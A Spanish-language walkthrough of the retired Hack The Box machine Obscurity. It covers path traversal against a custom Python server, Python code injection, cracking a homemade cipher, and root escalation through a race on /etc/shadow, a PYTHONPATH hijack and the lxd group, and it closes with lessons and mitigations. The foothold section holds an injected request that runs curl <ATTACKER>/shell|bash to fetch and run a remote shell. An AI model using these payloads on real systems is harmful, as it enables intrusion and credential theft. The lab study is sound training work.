---
machine: Obscurity
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, python, crypto, race-condition, lxd, privesc]
---

# Obscurity — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un servidor Python custom en 8080 permite directory traversal para leer su propio código y una inyección en el handler da `www-data`. Un cifrado casero con clave conocida descifra la contraseña de `robert`. `BetterSSH` se ejecuta como root: una carrera en el archivo temporal filtra `/etc/shadow` y una inyección en el comando permite ejecutar como root; también hay una vía por `PYTHONPATH` y otra por el grupo `lxd`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` SSH y `8080` un servidor HTTP propio llamado `BadHTTPServer`.
- `80` y `9000` están cerrados.
- La página menciona un directorio de desarrollo secreto.

## Enumeración

- `wfuzz` con `http://<IP>:8080/FUZZ/SuperSecureServer.py` descubre `/develop/`.
- El código muestra que el path se pasa a `exec` sin sanear.
- También se puede leer el archivo con `curl --path-as-is http://<IP>:8080/../SuperSecureServer.py`.

```bash
curl --path-as-is 'http://<IP>:8080/../SuperSecureServer.py'
```

## Foothold

Se envía una petición cuyo path incluye código Python; el servidor lo ejecuta y devuelve una reverse shell como `www-data`.

```http
GET /';os.system('curl <ATTACKER>/shell|bash');' HTTP/1.1
Host: <IP>:8080
```

## Movimiento lateral

En `/home/robert` están `SuperSecureCrypt.py`, `check.txt`, `out.txt` y `passwordreminder.txt`. El cifrado es un XOR/desplazamiento casero; con el texto plano de `check.txt` se recupera la clave `alexandrovich` y se descifra la contraseña de `robert`.

```bash
python3 SuperSecureCrypt.py -i out.txt -k "Encrypting this file..." -d -o key.txt
python3 SuperSecureCrypt.py -i passwordreminder.txt -d -k alexandrovich -o pass.txt
ssh robert@<IP>
```

## Escalada de privilegios

`robert` puede ejecutar `BetterSSH.py` como root. El script copia `/etc/shadow` a un archivo temporal y lo borra tras autenticar; una carrera permite leerlo. Además, el comando posterior a la autenticación se concatena sin validar, así que se inyecta `-u root cat /root/root.txt` o una shell.

```bash
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

La vía alternativa es `PYTHONPATH`: el script importa `subprocess` desde su directorio y un `subprocess.py` malicioso se ejecuta como root. La tercera es el grupo `lxd`, que permite montar `/` en un contenedor privilegiado.

## Evidencia

- `SuperSecureServer.py` y directory traversal.
- Inyección en el handler y shell `www-data`.
- Clave del cifrado casero y contraseña de `robert`.
- Carrera en `BetterSSH` y `/etc/shadow`.
- `PYTHONPATH` o `lxd` como root.

## Lecciones aprendidas

- Un servidor casero suele tener traversal y ejecución en el mismo handler.
- Los cifrados propios con clave derivada del texto plano no protegen nada.
- Los scripts privilegiados que copian `shadow` a `/tmp` son vulnerables a carreras.
- `PYTHONPATH` y el grupo `lxd` son escaladas locales recurrentes.

## Mitigación y detección

- Usar un servidor mantenido y normalizar rutas; nunca `exec` sobre la URL.
- Sustituir cifrados caseros por AEAD y gestionar claves fuera del código.
- No copiar `/etc/shadow` a archivos temporales; usar PAM.
- Revisar scripts privilegiados, `PYTHONPATH` y pertenencia a `lxd`.

## Referencias

- [0xdf — Obscurity](https://0xdf.gitlab.io/2020/05/09/htb-obscurity.html)
- [IppSec — Obscurity](https://www.youtube.com/watch?v=veq3w_j0WZQ)
- [Hack The Box — Obscurity](https://app.hackthebox.com/machines/obscurity)
